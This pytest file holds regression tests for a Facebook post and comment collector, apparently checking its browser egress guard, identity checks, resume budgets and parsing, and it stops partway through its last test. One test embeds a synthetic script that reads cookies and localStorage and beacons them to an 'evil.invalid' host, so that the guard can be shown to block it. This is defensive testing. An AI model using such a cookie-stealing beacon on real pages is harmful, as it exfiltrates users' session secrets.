"""Round-4 review regressions. Synthetic data; browsers connect only to loopback."""

import base64
import hashlib
import http.server
import json
import socket
import ssl
import subprocess
import threading
import time
from contextlib import contextmanager
from pathlib import Path

import pytest
from test_facebook import (
    _allow_loopback_sockets,
    _setup_fb_env,
    _synthetic_post_html,
    _write_facebook_config,
)

from metamuse import _browser_egress, app, config, facebook, jobs
from metamuse import models as m

URL = "https://www.facebook.com/synth.lab/posts/pfbid0101synth"


@pytest.fixture(autouse=True)
def reset_seams():
    yield
    facebook.set_driver_factory(None)
    facebook.set_egress_factory(None)
    facebook.set_secret_store_factory(None)
    facebook.set_resolver_factory(None)
    facebook.set_batch_hook(None)


def observation(markup, url=URL):
    return facebook.PageObservation(url=url, status_code=200, html=markup)


def submit(ctx, project, permit, *, url=URL, max_items=100, max_bytes=1_000_000):
    result = app.submit_collect(
        ctx,
        {
            "project_id": project,
            "inputs": [{"kind": "url", "url": url}],
            "resources": ["post", "comments"],
            "limits": {
                "max_urls": 1,
                "max_items": max_items,
                "max_bytes": max_bytes,
                "wall_clock_seconds": 60,
            },
            "access_grant_id": permit,
            "request_key": "review-job",
        },
    )
    assert result.status == "accepted", result
    return result.data["job_id"]


def finish(ctx, job_id):
    with jobs.Executor(ctx.store) as executor:
        executor.run(once=True)
    return app.get_job(ctx, {"job_id": job_id}).data["job"]


@contextmanager
def browser_fixture(tmp_path, monkeypatch, pages, *, url=URL, delays=None, unsandboxed=True):
    """Synthetic config with explicit sandbox choice; test-only TLS exemption."""
    if facebook.find_playwright_browser() is None:
        pytest.skip("Playwright or Chromium is not installed")
    _allow_loopback_sockets(monkeypatch)
    for key in facebook.PROXY_ENV_VARS:
        monkeypatch.delenv(key, raising=False)
    ctx, project, permit, auth_ref, secrets = _setup_fb_env(tmp_path, url=url)
    extra = (
        ["allow_unsandboxed_browser = true"]
        if "allow_unsandboxed_browser" in config.FacebookConfig.model_fields
        else []
    )
    _write_facebook_config(
        ctx.paths.root, auth_ref=auth_ref, allow_unsandboxed_browser=unsandboxed and bool(extra)
    )
    config_path = ctx.paths.root / "metamuse.toml"
    config_path.write_text(
        config_path.read_text().replace("read_timeout_seconds = 30", "read_timeout_seconds = 2")
    )
    ctx = app.AppContext.open(ctx.paths.root)
    cert, key = tmp_path / "cert.pem", tmp_path / "key.pem"
    subprocess.run(
        [
            "openssl",
            "req",
            "-x509",
            "-newkey",
            "rsa:2048",
            "-nodes",
            "-keyout",
            str(key),
            "-out",
            str(cert),
            "-days",
            "1",
            "-subj",
            "/CN=www.facebook.com",
        ],
        check=True,
        capture_output=True,
    )
    hits = []
    delays = delays or {}

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            hits.append((self.path, self.headers.get("Upgrade")))
            if self.headers.get("Upgrade", "").lower() == "websocket":
                accept = base64.b64encode(
                    hashlib.sha1(
                        (
                            self.headers["Sec-WebSocket-Key"]
                            + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
                        ).encode()
                    ).digest()
                ).decode()
                self.send_response(101)
                self.send_header("Upgrade", "websocket")
                self.send_header("Connection", "Upgrade")
                self.send_header("Sec-WebSocket-Accept", accept)
                self.end_headers()
                return
            path = self.path.split("?")[0]
            if path in delays:
                time.sleep(delays[path])
            value = pages.get(self.path, pages.get(path, "<html>Unclassified fixture</html>"))
            if callable(value):
                value = value(self)
            if isinstance(value, tuple):
                self.send_response(value[0])
                if value[1] is not None:
                    self.send_header("Location", value[1])
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            body = value.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            try:
                self.wfile.write(body)
            except OSError:
                pass

        def log_message(self, *args):
            pass

    tls = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    tls.load_cert_chain(cert, key)

    class TLSFixtureServer(http.server.ThreadingHTTPServer):
        daemon_threads = True

        def get_request(self):
            sock, address = super().get_request()
            sock.settimeout(2)
            return tls.wrap_socket(sock, server_side=True), address

    server = TLSFixtureServer(("127.0.0.1", 0), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    guard = facebook.EgressGuard.for_fixture_test(
        allowed_hosts=("www.facebook.com",), resolver=lambda _: ["127.0.0.1"]
    )
    facebook.set_egress_factory(lambda _: guard)

    class TestDriver(facebook.PlaywrightBrowserDriver):
        def open_session(self, *args, **kwargs):
            session = super().open_session(*args, **kwargs)
            session._context.new_cdp_session(session._page).send(
                "Security.setIgnoreCertificateErrors", {"ignore": True}
            )
            return session

    driver = TestDriver(_test_origin=f"https://www.facebook.com:{server.server_port}")
    facebook.set_driver_factory(lambda: driver)
    try:
        yield ctx, project, permit, secrets, hits, guard, driver
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)


@pytest.mark.parametrize(
    "hosts",
    [
        [],
        ["*.facebook.com"],
        ["*.fbcdn.net"],
        ["127.0.0.1"],
        ["localhost"],
        ["probe.local"],
        [""],
        ["bad host"],
        ["www.facebook.com", "bad/host"],
        ["www.facebook.com?synthetic=query"],
        ["www.facebook.com#synthetic-fragment"],
    ],
)
def test_finding_01_invalid_allowlist_is_fixed_config_error(tmp_path: Path, hosts):
    tmp_path.mkdir(exist_ok=True)
    _write_facebook_config(tmp_path, extra_facebook_lines=[f"allowed_hosts = {json.dumps(hosts)}"])
    with pytest.raises(m.CoreError) as error:
        config.load_config(tmp_path)
    assert error.value.detail.code == m.ErrorCode.INPUT_INVALID
    assert error.value.detail.message == "Invalid Facebook host allowlist"
    with pytest.raises(m.CoreError):
        facebook.EgressGuard(allowed_hosts=hosts, resolver=lambda _: ["93.184.216.34"])


def test_finding_01_defaults_keep_exact_host_restriction():
    guard = facebook.EgressGuard(
        allowed_hosts=config.DEFAULT_FACEBOOK_ALLOWED_HOSTS, resolver=lambda _: ["93.184.216.34"]
    )
    with pytest.raises(m.CoreError) as error:
        guard.check_proxy_target("https://unapproved.example/", method="CONNECT", is_connect=True)
    assert error.value.detail.code == m.ErrorCode.SCOPE_DENIED


def test_finding_02_browser_secret_hostname_never_reaches_diagnostics(tmp_path, monkeypatch):
    prefix = "SYNTH"
    cookie, storage = f"{prefix}-Cookie", f"{prefix}-Storage"
    script = """<script>
    const values = [document.cookie.split('=')[1], localStorage.getItem('fixture')];
    for (const token of values) {
      for (const encoded of [token, token.toLowerCase(),
             '%' + token.charCodeAt(0).toString(16) + token.slice(1)]) {
        new Image().src = 'https://' + encoded + '.evil.invalid/private?q=' + token;
      }
    }
    </script>"""
    markup = _synthetic_post_html().replace("</body>", script + "</body>")
    with browser_fixture(tmp_path, monkeypatch, {"/synth.lab/posts/pfbid0101synth": markup}) as env:
        ctx, project, permit, secrets, hits, guard, _ = env
        state = {
            "cookies": [
                {
                    "name": "fixture",
                    "value": cookie,
                    "domain": "www.facebook.com",
                    "path": "/",
                    "secure": True,
                    "httpOnly": False,
                }
            ],
            "origins": [
                {
                    "origin": "https://www.facebook.com",
                    "localStorage": [{"name": "fixture", "value": storage}],
                }
            ],
        }
        # localStorage origins include the synthetic TLS port, via test-only context init.
        driver = env[-1]
        original_open = driver.open_session

        def open_with_storage(*args, **kwargs):
            session = original_open(*args, **kwargs)
            session._context.add_init_script(
                f"localStorage.setItem('fixture', {json.dumps(storage)})"
            )
            return session

        monkeypatch.setattr(driver, "open_session", open_with_storage)
        ref = secrets.put(
            json.dumps(state).encode(),
            provider="facebook",
            account="acct_synth",
            created_at=ctx.clock(),
        )["auth_ref"]
        extra = (
            ["allow_unsandboxed_browser = true"]
            if "allow_unsandboxed_browser" in config.FacebookConfig.model_fields
            else []
        )
        _write_facebook_config(ctx.paths.root, auth_ref=ref, allow_unsandboxed_browser=bool(extra))
        ctx = app.AppContext.open(ctx.paths.root)
        job_id = submit(ctx, project, permit)
        finish(ctx, job_id)
        visible = app.get_job(ctx, {"job_id": job_id}).model_dump_json()
        with ctx.store.connection() as conn:
            visible += str(
                [
                    tuple(row)
                    for row in conn.execute(
                        "SELECT checkpoint,result,error FROM job_steps WHERE job_id=?", (job_id,)
                    )
                ]
            )
            visible += str(
                [
                    tuple(row)
                    for row in conn.execute("SELECT detail FROM events WHERE job_id=?", (job_id,))
                ]
            )
        assert guard.summary()["aborted"] >= 2
        for token in (cookie, storage):
            assert token.casefold() not in visible.casefold()
            assert (
                "%" + format(ord(token[0]), "x") + token[1:]
            ).casefold() not in visible.casefold()
        assert "evil.invalid" not in visible
        assert all("hostname" not in row for row in guard.summary()["aborted_reasons"])
        assert all(upgrade is None for _, upgrade in hits)


@pytest.mark.parametrize(
    "other_actor,other_id",
    [("other.actor", "OTHER_POST"), ("synth.lab", "12345"), ("other.actor", "pfbid0101synth")],
)
def test_finding_03_extracted_identity_must_match(tmp_path, other_actor, other_id):
    ctx, project, permit, _, _ = _setup_fb_env(tmp_path)
    driver = facebook.FixtureBrowserDriver(
        observation(_synthetic_post_html(actor=other_actor, post_id=other_id))
    )
    facebook.set_driver_factory(lambda: driver)
    job = finish(ctx, submit(ctx, project, permit))
    assert job["error"]["code"] == "E_REFERENCE_INVALID"
    with ctx.store.connection() as conn:
        assert conn.execute("SELECT COUNT(*) FROM items").fetchone()[0] == 0


@pytest.mark.parametrize("hop", ["redirect", "script", "meta"])
def test_finding_03_browser_navigation_identity_stops_before_import(tmp_path, monkeypatch, hop):
    path = "/synth.lab/posts/pfbid0101synth"
    other = "/other.actor/posts/OTHER_POST"
    if hop == "redirect":
        initial = (302, other)
    elif hop == "script":
        initial = f"<script>location.replace('{other}')</script>"
    else:
        initial = f'<meta http-equiv="refresh" content="0;url={other}">'
    pages = {path: initial, other: _synthetic_post_html(actor="other.actor", post_id="OTHER_POST")}
    with browser_fixture(tmp_path, monkeypatch, pages) as env:
        ctx, project, permit, _, hits, _, _ = env
        job = finish(ctx, submit(ctx, project, permit))
        assert job["error"]["code"] == "E_REFERENCE_INVALID"
        with ctx.store.connection() as conn:
            assert conn.execute("SELECT COUNT(*) FROM sources").fetchone()[0] == 0
            assert conn.execute("SELECT COUNT(*) FROM items").fetchone()[0] == 0
        if hop == "redirect":
            # An encrypted 302 hop is invisible to Playwright routing until committed.
            assert any(request == other for request, _ in hits)
        else:
            assert all(request != other for request, _ in hits)


@pytest.mark.parametrize("worker_kind", ["Worker", "SharedWorker"])
def test_finding_04_approved_wss_and_worker_wss_closed_before_handshake(
    tmp_path, monkeypatch, worker_kind
):
    script = """<script>
    window.states = [];
    const socket = new WebSocket('wss://' + location.host + '/ws');
    socket.onopen = () => states.push('open');
    socket.onclose = () => states.push('closed');
    const source = `const s = new WebSocket('wss://${location.host}/ws-worker');
      s.onopen = () => postMessage('open'); s.onclose = () => postMessage('closed');`;
    const worker = new Worker(URL.createObjectURL(new Blob([source], {type: 'text/javascript'})));
    worker.onmessage = (event) => states.push(event.data);
    </script>"""
    script = script.replace("new Worker(", f"new {worker_kind}(")
    markup = _synthetic_post_html().replace("</body>", script + "</body>")
    with browser_fixture(tmp_path, monkeypatch, {"/synth.lab/posts/pfbid0101synth": markup}) as env:
        ctx, _, _, _, hits, guard, driver = env
        state = facebook.load_storage_state(ctx.policy.facebook.auth_ref, account="acct_synth")
        options = (
            {"allow_unsandboxed_browser": True}
            if "allow_unsandboxed_browser" in config.FacebookConfig.model_fields
            else {}
        )
        session = driver.open_session(state, guard, timeout_ms=2000, **options)
        try:
            session.goto_post(URL)
            session._page.wait_for_function("window.states.includes('closed')", timeout=2000)
            session._page.wait_for_timeout(200)
            assert session._page.evaluate("window.states") == ["closed"]
            assert session.workers_blocked >= 1
            assert not any(upgrade for _, upgrade in hits)
            assert guard.summary()["aborted"] >= 2
        finally:
            session.close()


@pytest.mark.parametrize(
    "barrier,code",
    [
        ("login", "E_AUTH_REQUIRED"),
        ("checkpoint", "E_CHECKPOINT_REQUIRED"),
        ("challenge", "E_CHECKPOINT_REQUIRED"),
    ],
)
def test_finding_05_encrypted_barrier_redirect_is_distinct(tmp_path, monkeypatch, barrier, code):
    pages = {
        "/synth.lab/posts/pfbid0101synth": (302, f"/{barrier}/"),
        f"/{barrier}/": _synthetic_post_html(),
    }
    with browser_fixture(tmp_path, monkeypatch, pages) as env:
        ctx, project, permit, _, _, _, _ = env
        job_id = submit(ctx, project, permit)
        job = finish(ctx, job_id)
        assert job["error"]["code"] == code
        assert job["state"] == "awaiting_user"
        assert job["limits"]["safe_read_retries"] == 0
        with ctx.store.connection() as conn:
            assert conn.execute("SELECT COUNT(*) FROM items").fetchone()[0] == 0
    with pytest.raises(m.CoreError) as error:
        facebook.classify_and_parse_observation(
            observation(_synthetic_post_html(), f"https://www.facebook.com/{barrier}/"),
            permalink=facebook.parse_post_permalink(URL),
            require_comments_section=True,
        )
    assert error.value.detail.code.value == code


def test_finding_06_close_cancels_waiting_resolution_and_prevents_late_dial(monkeypatch):
    _allow_loopback_sockets(monkeypatch)
    entered, release, finished = threading.Event(), threading.Event(), threading.Event()
    dials = []
    real_connect = socket.create_connection

    def slow_resolver(_):
        entered.set()
        release.wait(5)
        finished.set()
        return ["127.0.0.1"]

    guard = facebook.EgressGuard.for_fixture_test(
        allowed_hosts=("allowed.test",), resolver=slow_resolver
    )
    target = socket.socket()
    target.bind(("127.0.0.1", 0))
    target.listen()
    port = target.getsockname()[1]

    def spy_connect(address, *args, **kwargs):
        if address[1] == port:
            dials.append(address)
        return real_connect(address, *args, **kwargs)

    monkeypatch.setattr(socket, "create_connection", spy_connect)
    proxy = _browser_egress.BrowserEgressProxy(guard, idle_timeout_s=0.5)
    client = real_connect(("127.0.0.1", proxy.port), timeout=2)
    try:
        client.sendall(f"CONNECT allowed.test:{port} HTTP/1.1\r\n\r\n".encode())
        assert entered.wait(2)
        proxy.close()
        release.set()
        assert finished.wait(2)
        for worker in proxy._worker_threads:
            worker.join(timeout=2)
        assert not any(worker.is_alive() for worker in proxy._worker_threads)
        assert dials == []
        assert proxy._active_sockets == set()
    finally:
        release.set()
        proxy.close()
        client.close()
        target.close()


def crash_after_batch(ctx, job_id):
    def crash(_):
        raise RuntimeError("synthetic checkpoint crash")

    facebook.set_batch_hook(crash)
    with jobs.Executor(ctx.store) as executor:
        with ctx.store.transaction() as conn:
            conn.execute(
                "UPDATE jobs SET state='running',worker_epoch=? WHERE id=?",
                (executor.epoch, job_id),
            )
            conn.execute(
                "UPDATE job_steps SET state='running',worker_epoch=?,attempts=1 WHERE job_id=?",
                (executor.epoch, job_id),
            )
        with ctx.store.connection() as conn:
            step_id = conn.execute("SELECT id FROM job_steps WHERE job_id=?", (job_id,)).fetchone()[
                0
            ]
        step = jobs.StepContext(
            executor, ctx.store.get(m.Job, job_id), ctx.store.get(m.JobStep, step_id)
        )
        with pytest.raises(RuntimeError, match="synthetic checkpoint crash"):
            facebook.run_facebook_post(step)
    facebook.set_batch_hook(None)
    return ctx.store.get(m.JobStep, step_id).checkpoint


@pytest.mark.parametrize("budget", ["expansions", "bytes", "items"])
def test_finding_07_resume_preserves_cumulative_budgets(tmp_path, budget):
    ctx, project, permit, _, _ = _setup_fb_env(tmp_path, max_expansions=1)
    comments = [{"id": f"c_{i}", "text": f"Observed {i}"} for i in range(60)]
    first = _synthetic_post_html(expand_controls=[{"id": "more"}])
    expanded = _synthetic_post_html(comments=comments)
    byte_cap = (
        len(first.encode()) + len(expanded.encode()) + 100 if budget == "bytes" else 1_000_000
    )
    item_cap = 61 if budget == "items" else 100
    allocations = []

    class BudgetDriver(facebook.FixtureBrowserDriver):
        def open_session(self, *args, **kwargs):
            allocations.append(kwargs.get("max_bytes"))
            return super().open_session(*args, **kwargs)

    driver = BudgetDriver(observation(first), {"more": observation(expanded)})
    facebook.set_driver_factory(lambda: driver)
    job_id = submit(ctx, project, permit, max_items=item_cap, max_bytes=byte_cap)
    saved = crash_after_batch(ctx, job_id)
    assert saved["accepted"] == 50
    assert saved["expansions_used"] == 1
    if budget == "items":
        driver.initial = observation(
            _synthetic_post_html(comments=[{"id": "new_top", "text": "New top"}, *comments])
        )
    job = finish(ctx, job_id)
    observed = job["observed_scope"]["steps"][0]
    assert observed["expansions_used"] == 1
    assert observed["bytes_used"] >= saved["bytes_used"]
    assert observed["accepted"] <= item_cap
    assert allocations == [byte_cap, byte_cap - saved["bytes_used"]]
    assert len(driver.expanded_controls) == 1
    with ctx.store.connection() as conn:
        assert conn.execute("SELECT COUNT(*) FROM items").fetchone()[0] <= item_cap
        assert conn.execute("SELECT used FROM permits WHERE id=?", (permit,)).fetchone()[0] == 1
    assert job["coverage_status"] in ("bounded", "partial")


def test_finding_07_failed_navigation_still_checkpoints_wire_bytes(tmp_path, monkeypatch):
    path = "/synth.lab/posts/pfbid0101synth"
    pages = {path: (302, "/login/"), "/login/": _synthetic_post_html()}
    with browser_fixture(tmp_path, monkeypatch, pages) as env:
        ctx, project, permit, _, _, guard, _ = env
        job_id = submit(ctx, project, permit)
        job = finish(ctx, job_id)
        assert job["error"] is not None
        checkpoint = app.get_job(ctx, {"job_id": job_id}).data["steps"][0]["checkpoint"] or {}
        assert guard.bytes_relayed > 0
        assert checkpoint.get("bytes_used", 0) >= guard.bytes_relayed


def test_finding_08_weak_records_never_duplicate_on_resume(tmp_path):
    ctx, project, permit, _, _ = _setup_fb_env(tmp_path)
    markup = _synthetic_post_html(comments=[{"text": f"Weak {i}"} for i in range(60)])
    driver = facebook.FixtureBrowserDriver(observation(markup))
    facebook.set_driver_factory(lambda: driver)
    job_id = submit(ctx, project, permit)
    crash_after_batch(ctx, job_id)
    job = finish(ctx, job_id)
    with ctx.store.connection() as conn:
        assert conn.execute("SELECT COUNT(*) FROM items").fetchone()[0] == 50
        assert (
            conn.execute("SELECT COUNT(*) FROM item_revisions WHERE text='Weak 0'").fetchone()[0]
            == 1
        )
        assert conn.execute("SELECT used FROM permits WHERE id=?", (permit,)).fetchone()[0] == 1
    assert "weak_identity_resume" in job["missing_fields"]
    assert job["coverage_status"] == "partial"


@pytest.mark.parametrize("delayed", [True, False])
def test_finding_09_expansion_waits_for_progress_or_records_uncertainty(
    tmp_path, monkeypatch, delayed
):
    markup = _synthetic_post_html(expand_controls=[{"id": "more"}])
    action = "this.remove();"
    if delayed:
        action += """setTimeout(() => {
          const node = document.createElement('article'); node.dataset.fbRole = 'comment';
          node.dataset.commentId = 'delayed';
          node.innerHTML = '<div data-fb-role=comment-body>Delayed comment</div>';
          document.querySelector('section').appendChild(node);
        }, 500);"""
    import html

    markup = markup.replace(
        'data-expand-id="more"',
        'data-expand-id="more" onclick="' + html.escape(action, quote=True) + '"',
    )
    with browser_fixture(tmp_path, monkeypatch, {"/synth.lab/posts/pfbid0101synth": markup}) as env:
        ctx, project, permit, _, _, _, _ = env
        job = finish(ctx, submit(ctx, project, permit))
        observed = job["observed_scope"]["steps"][0]
        if delayed:
            with ctx.store.connection() as conn:
                assert (
                    conn.execute("SELECT COUNT(*) FROM items WHERE native_id='delayed'").fetchone()[
                        0
                    ]
                    == 1
                )
            assert observed["comments_observed"] == 1
            assert "expansion_progress_timeout" not in job["missing_fields"]
        else:
            assert "expansion_progress_timeout" in job["missing_fields"]
            assert job["coverage_status"] == "partial"
            assert observed["comments_empty"] is False


@pytest.mark.parametrize("edited", [False, True])
def test_finding_10_paginated_observations_accumulate_by_identity(tmp_path, edited):
    ctx, project, permit, _, _ = _setup_fb_env(tmp_path)
    initial = _synthetic_post_html(
        comments=[{"id": "first", "text": "First page"}], expand_controls=[{"id": "more"}]
    )
    final_comments = [{"id": "second", "text": "Second page"}]
    if edited:
        final_comments.append({"id": "first", "text": "Edited first page"})
    final = _synthetic_post_html(comments=final_comments)
    driver = facebook.FixtureBrowserDriver(observation(initial), [observation(final)])
    facebook.set_driver_factory(lambda: driver)
    job = finish(ctx, submit(ctx, project, permit))
    with ctx.store.connection() as conn:
        ids = {row[0] for row in conn.execute("SELECT native_id FROM items")}
        assert {"first", "second"} <= ids
        revisions = [
            row[0]
            for row in conn.execute(
                "SELECT r.text FROM item_revisions r JOIN items i ON i.id=r.item_id "
                "WHERE i.native_id='first' ORDER BY r.revision"
            )
        ]
        assert revisions == (["First page", "Edited first page"] if edited else ["First page"])
    assert job["observed_scope"]["steps"][0]["comments_observed"] == 2


def test_finding_10_reverted_text_retains_order_and_snapshot_provenance(tmp_path):
    ctx, project, permit, _, _ = _setup_fb_env(tmp_path)
    snapshots = [
        _synthetic_post_html(
            comments=[{"id": "edited", "text": text}],
            expand_controls=[{"id": f"more_{index}"}] if index < 2 else [],
        )
        for index, text in enumerate(["Original", "Edited", "Original"])
    ]
    driver = facebook.FixtureBrowserDriver(
        observation(snapshots[0]), [observation(html) for html in snapshots[1:]]
    )
    facebook.set_driver_factory(lambda: driver)
    finish(ctx, submit(ctx, project, permit))
    with ctx.store.connection() as conn:
        rows = conn.execute(
            "SELECT r.text,r.evidence FROM item_revisions r JOIN items i ON i.id=r.item_id "
            "WHERE i.native_id='edited' ORDER BY r.revision"
        ).fetchall()
        assert [row[0] for row in rows] == ["Original", "Edited", "Original"]
        assert [json.loads(row[1])["input_sha256"] for row in rows] == [
            hashlib.sha256(html.encode()).hexdigest() for html in snapshots
        ]
        source = conn.execute("SELECT use_basis FROM sources WHERE native_id='edited'").fetchone()
        assert (
            json.loads(source[0])["input_sha256"]
            == hashlib.sha256(snapshots[0].encode()).hexdigest()
        )


@pytest.mark.parametrize("case", ["contradictory", "unknown", "affirmative", "missing_controls"])
def test_finding_11_empty_requires_affirmative_evidence_and_counts_cannot_contradict(
    tmp_path, case
):
    ctx, project, permit, _, _ = _setup_fb_env(tmp_path)
    comments = [{"id": "one", "text": "Observed one"}] if case == "missing_controls" else []
    markup = _synthetic_post_html(comments=comments)
    if case in ("contradictory", "missing_controls"):
        markup = markup.replace(f'data-comment-count="{len(comments)}"', 'data-comment-count="100"')
    if case == "unknown":
        markup = markup.replace('data-comments-exhausted="true"', "")
    driver = facebook.FixtureBrowserDriver(observation(markup))
    facebook.set_driver_factory(lambda: driver)
    job = finish(ctx, submit(ctx, project, permit))
    observed = job["observed_scope"]["steps"][0]
    if case == "affirmative":
        assert job["coverage_status"] == "scope_satisfied"
        assert observed["comments_empty"] is True
    else:
        assert job["coverage_status"] == "partial"
        assert observed["comments_empty"] is False
        gap = "comments_scope_unverified" if case == "unknown" else "rendered_count_conflict"
        assert gap in job["missing_fields"]
        with ctx.store.connection() as conn:
            post = conn.execute(
                "SELECT complete,missing_fields FROM item_revisions r "
                "JOIN items i ON i.id=r.item_id WHERE i.kind='post'"
            ).fetchone()
            assert post[0] == 0
            assert gap in json.loads(post[1])


def test_finding_12_reply_without_parent_has_item_and_job_gap(tmp_path):
    ctx, project, permit, _, _ = _setup_fb_env(tmp_path)
    driver = facebook.FixtureBrowserDriver(
        observation(
            _synthetic_post_html(
                comments=[
                    {"kind": "reply", "id": "parentless", "text": "Parent identity unavailable"}
                ]
            )
        )
    )
    facebook.set_driver_factory(lambda: driver)
    job = finish(ctx, submit(ctx, project, permit))
    assert "parent_comment" in job["missing_fields"]
    assert job["coverage_status"] == "partial"
    with ctx.store.connection() as conn:
        row = conn.execute(
            "SELECT i.parent_id,i.unresolved_parent,r.complete,r.missing_fields "
            "FROM items i JOIN item_revisions r ON r.item_id=i.id "
            "WHERE i.native_id='parentless'"
        ).fetchone()
        assert row[:3] == (None, None, 0)
        assert "parent_comment" in json.loads(row[3])


@pytest.mark.parametrize("blocks", [False, True])
def test_finding_13_text_and_hash_preserve_entities_breaks_and_edges(tmp_path, blocks):
    ctx, project, permit, _, _ = _setup_fb_env(tmp_path)
    expected = "  literal &amp; &#65;\nnext  "
    markup = _synthetic_post_html(
        post_text="PLACEHOLDER", comments=[{"id": "fidelity", "text": "PLACEHOLDER"}]
    )
    replacement = "  literal &amp;amp; &amp;#65;<br>next  "
    if blocks:
        expected = "  start\nblock one\nblock two\nend  "
        replacement = "  start<p>block one</p><div>block two</div>end  "
    markup = markup.replace("PLACEHOLDER", replacement)
    driver = facebook.FixtureBrowserDriver(observation(markup))
    facebook.set_driver_factory(lambda: driver)
    finish(ctx, submit(ctx, project, permit))
    with ctx.store.connection() as conn:
        rows = conn.execute("SELECT text,text_hash FROM item_revisions").fetchall()
        assert len(rows) == 2
        assert all(row[0] == expected for row in rows)
        assert all(row[1] == m.payload_digest({"text": expected}) for row in rows)


@pytest.mark.parametrize(
    "marker,code",
    [
        ('<meta data-fb-state="login_wall">', m.ErrorCode.AUTH_REQUIRED),
        ('<meta data-page-state="challenge"/>', m.ErrorCode.CHECKPOINT_REQUIRED),
        ('<input data-checkpoint="true">', m.ErrorCode.CHECKPOINT_REQUIRED),
    ],
)
def test_finding_13_void_tags_preserve_barrier_classification(marker, code):
    with pytest.raises(m.CoreError) as error:
        facebook.classify_and_parse_observation(
            observation(marker + _synthetic_post_html()),
            permalink=facebook.parse_post_permalink(URL),
            require_comments_section=True,
        )
    assert error.value.detail.code == code


@pytest.mark.parametrize("self_closing", [False, True])
def test_finding_13_void_spellings_do_not_truncate_source_text(self_closing):
    suffix = "/" if self_closing else ""
    markup = _synthetic_post_html(post_text="PLACEHOLDER")
    body = f"before<area{suffix}><embed{suffix}><track{suffix}>after"
    page = facebook.classify_and_parse_observation(
        observation(markup.replace("PLACEHOLDER", body)),
        permalink=facebook.parse_post_permalink(URL),
        require_comments_section=True,
    )
    assert page.text == "beforeafter"


@pytest.mark.parametrize("suffix", [":NOT_A_PORT", ":70000", ":0", ":81", "/path", "?q=value"])
def test_finding_14_invalid_origin_is_fixed_auth_error_and_inspection_row(tmp_path, suffix):
    ctx, _, _, _, secrets = _setup_fb_env(tmp_path)
    prefix = "SYNTH"
    state = {
        "cookies": [{"name": "fixture", "value": f"{prefix}_COOKIE", "domain": "www.facebook.com"}],
        "origins": [{"origin": "https://www.facebook.com" + suffix, "localStorage": []}],
    }
    raw = json.dumps(state).encode()
    with pytest.raises(m.CoreError) as error:
        facebook.sanitize_storage_state(raw)
    assert error.value.detail.code == m.ErrorCode.AUTH_REQUIRED
    assert error.value.detail.message == "Invalid Facebook storage-state origin"
    ref = secrets.put(raw, provider="facebook", account="acct_synth", created_at=ctx.clock())[
        "auth_ref"
    ]
    _write_facebook_config(ctx.paths.root, auth_ref=ref)
    ctx = app.AppContext.open(ctx.paths.root)
    facebook.set_driver_factory(
        lambda: facebook.FixtureBrowserDriver(observation(_synthetic_post_html()))
    )
    envelope = app.inspect_capabilities(ctx, {})
    assert envelope.status == "ok"
    row = next(
        r for r in envelope.data["capabilities"] if r["name"] == "metamuse_collect.facebook_post"
    )
    assert row["environment"] == "needs_auth"
    assert suffix not in envelope.model_dump_json()


@pytest.mark.parametrize("entry", [None, 123, "not-an-origin-entry", {}, {"origin": None}])
def test_finding_14_invalid_origin_entry_shape_is_fixed_auth_error(entry):
    prefix = "SYNTH"
    raw = json.dumps(
        {
            "cookies": [
                {"name": "fixture", "value": f"{prefix}_COOKIE", "domain": "www.facebook.com"}
            ],
            "origins": [entry],
        }
    ).encode()
    with pytest.raises(m.CoreError) as error:
        facebook.sanitize_storage_state(raw)
    assert error.value.detail.code == m.ErrorCode.AUTH_REQUIRED
    assert error.value.detail.message == "Invalid Facebook storage-state origin"


def test_finding_15_oversized_connect_port_gets_fixed_4xx_without_worker_traceback(
    monkeypatch, capsys
):
    _allow_loopback_sockets(monkeypatch)
    lookups = []
    guard = facebook.EgressGuard(
        allowed_hosts=("allowed.test",),
        resolver=lambda host: lookups.append(host) or ["93.184.216.34"],
    )
    raw = b"CONNECT allowed.test:" + b"9" * 5000 + b" HTTP/1.1\r\n\r\n"
    with pytest.raises(_browser_egress.ProxyRequestError) as error:
        _browser_egress.parse_proxy_request(raw)
    assert error.value.reason == "bad_port"
    proxy = _browser_egress.BrowserEgressProxy(guard, idle_timeout_s=0.5)
    try:
        with socket.create_connection(("127.0.0.1", proxy.port), timeout=2) as client:
            client.sendall(raw)
            assert client.recv(4096).startswith(b"HTTP/1.1 403 Forbidden")
        assert proxy._accept_thread.is_alive()
        assert guard.summary()["aborted"] == 1
        assert lookups == []
    finally:
        proxy.close()
    assert "Traceback" not in capsys.readouterr().err


def test_sandbox_failed_default_launch_is_fixed_and_never_retries(monkeypatch, tmp_path):
    import playwright.sync_api as pw_sync

    attempts = []
    stopped = []

    class Launcher:
        def __init__(self):
            self.chromium = self

        def start(self):
            return self

        def stop(self):
            stopped.append(True)

        def launch(self, **kwargs):
            attempts.append(kwargs)
            raise RuntimeError("synthetic sandbox unavailable")

    monkeypatch.setattr(pw_sync, "sync_playwright", Launcher)
    monkeypatch.setattr(facebook, "find_playwright_browser", lambda: tmp_path / "fake-browser")
    prefix = "SYNTH"
    state = facebook.sanitize_storage_state(
        json.dumps(
            {
                "cookies": [
                    {"name": "fixture", "value": f"{prefix}_COOKIE", "domain": "www.facebook.com"}
                ]
            }
        ).encode()
    )
    guard = facebook.EgressGuard(allowed_hosts=("www.facebook.com",), resolver=lambda _: [])
    with pytest.raises(m.CoreError) as error:
        facebook.PlaywrightBrowserDriver().open_session(state, guard, timeout_ms=1000)
    assert error.value.detail.code == m.ErrorCode.DEPENDENCY_MISSING
    assert "AppArmor" in error.value.detail.next_action
    assert "allow_unsandboxed_browser" in error.value.detail.next_action
    assert len(attempts) == 1 and attempts[0]["chromium_sandbox"] is True
    assert stopped == [True]


@pytest.mark.parametrize(
    "opt_in,verified,environment",
    [(False, False, "unavailable"), (False, True, "ready"), (True, False, "ready")],
)
def test_sandbox_capability_and_job_record_operator_mode(tmp_path, opt_in, verified, environment):
    ctx, project, permit, auth_ref, _ = _setup_fb_env(tmp_path)
    _write_facebook_config(ctx.paths.root, auth_ref=auth_ref, allow_unsandboxed_browser=opt_in)
